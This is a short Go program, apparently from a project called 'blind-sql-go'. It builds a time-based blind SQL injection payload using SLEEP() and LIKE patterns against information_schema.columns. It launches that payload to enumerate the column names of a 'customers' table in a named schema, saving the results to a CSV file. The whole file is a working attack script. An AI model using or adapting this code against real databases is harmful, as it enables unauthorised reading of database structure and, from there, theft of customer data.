package main

import (
	"fmt"

	"github.com/remoschaer86/blind-sql-go/internal/attack"
)

func execSql(likestr string, sleep int) string {
	sc := fmt.Sprintf(`
	(SELECT
		CASE WHEN COUNT(*) > 0 THEN SLEEP(%d) ELSE SLEEP(0) END AS sleep_time
		FROM
		information_schema.columns
	WHERE table_name='customers' AND TABLE_SCHEMA='glocken_emil' AND COLUMN_NAME LIKE '%s')
`, sleep, likestr)
	return sc
}

func main() {

	const charset = "abcdefghijklmnopqrstuvwxyz_"

	tba := attack.NewTimeBasedAttack(charset, execSql, 3)

	err := tba.Launch("../../data/customer_columns.csv", 100)

	if err != nil {
		panic(err)
	}

}
